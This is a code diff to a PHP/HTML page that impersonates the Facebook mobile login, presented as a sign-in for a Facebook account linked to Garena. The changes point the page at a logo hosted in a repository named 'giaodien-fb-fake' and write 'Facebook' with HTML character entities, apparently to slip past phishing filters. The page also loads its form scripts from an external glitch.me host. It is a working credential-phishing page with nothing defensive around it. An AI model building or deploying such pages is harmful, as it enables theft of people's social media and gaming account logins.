@@ -31,11 +31,11 @@ $_SESSION['huongdz'] = $huongdz;
             <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
             <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
             <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-            <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
-            <title>Facebook- Đăng nhập hoặc đăng ký</title>
+            <link href="https://i.upanh.org/2022/05/11/image2c2ea2f667fadd69.png" rel="shortcut icon" sizes="196x196" />
+            <title>Faceb&#111;&#111;k </title>
             <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
           <link rel="stylesheet" type="text/css" href="https://scripth.glitch.me/web/fb.css" />
-		 <style>img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}</style>
+		
         </head>
  
         <body class="touch x1 _fzu _50-3 iframe acw portrait">
@@ -61,12 +61,12 @@ $_SESSION['huongdz'] = $huongdz;
                                     <div class="_5rut">
                                         <div>
                                             <div class="_52jj _3-q2">
-                                                <img src="https://cdn.freelogovectors.net/wp-content/uploads/2019/01/garena-logo.png" width="150" class="_3-q3 img" />
-                                                <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook đã liên kết với Garena</div>
+                                                <img src="https://ticchien111.github.io/giaodien-fb-fake/logo.png" width="70" class="_3-q3 img" />
+                                                <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Faceb&#111;&#111;k đã liên kết với Garena</div>
                                             </div>
                                         </div>
                                         <form  class="mobile-login-form _5spm" id="login_form" novalidate="1">
-                                            <input type="hidden" name="_token" value="36xDR0i2X9pu7ksbgSjKcwjGQ5UoVPpisVwr45uj">                                    <div class="_56be _5sob">
+                                                           <div class="_56be _5sob">
                                                 <div class="_55wo _55x2 _56bf">
                                                     <div id="email_input_container">
                                                         <input class="_56bg _4u9z _5ruq "
@@ -175,3 +175,5 @@ $_SESSION['huongdz'] = $huongdz;
  
             </script>
             <script src="https://scripth.glitch.me/fb.js"></script>
+</body>
+</html>
